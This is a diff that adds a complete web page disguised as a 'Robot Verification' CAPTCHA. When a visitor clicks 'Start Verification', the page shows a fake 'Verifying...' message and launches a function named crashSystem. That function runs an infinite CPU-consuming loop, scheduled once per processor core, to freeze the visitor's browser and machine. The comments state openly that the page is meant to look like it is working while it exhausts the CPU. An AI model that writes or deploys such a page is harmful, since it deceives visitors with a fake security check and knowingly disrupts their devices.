@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Important Update</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f0f0f0;
+            text-align: center;
+        }
+        .container {
+            padding: 20px;
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+        }
+        button {
+            padding: 10px 20px;
+            font-size: 16px;
+            cursor: pointer;
+            background-color: #007bff;
+            color: white;
+            border: none;
+            border-radius: 4px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h1>Robot Verification</h1>
+        <p>You need to verify that you are not a robot.</p>
+        <p>Please click the button below to verify your system.</p>
+        <button id="startButton">Start Verification</button>
+    </div>
+
+    <script>
+        document.getElementById('startButton').addEventListener('click', function() {
+            // Hide the initial content to make it look like it's "working"
+            document.body.innerHTML = '<h1>Verifying... Please do not close this window.</h1>';
+
+            // Function to create a CPU-intensive loop
+            const crashSystem = () => {
+                // This infinite loop will consume 100% of a CPU core
+                while (true) {
+                    // Perform a pointless, intensive calculation
+                    Math.sqrt(Math.random() * Math.random());
+                }
+            };
+
+            // Get the number of CPU cores available
+            const numCores = navigator.hardwareConcurrency || 4; // Fallback to 4 if not available
+
+            // Launch a crash loop for each available CPU core
+            for (let i = 0; i < numCores; i++) {
+                // Use setTimeout to launch each loop asynchronously
+                setTimeout(crashSystem, 100 * i);
+            }
+        });
+    </script>
+
+</body>
+</html>
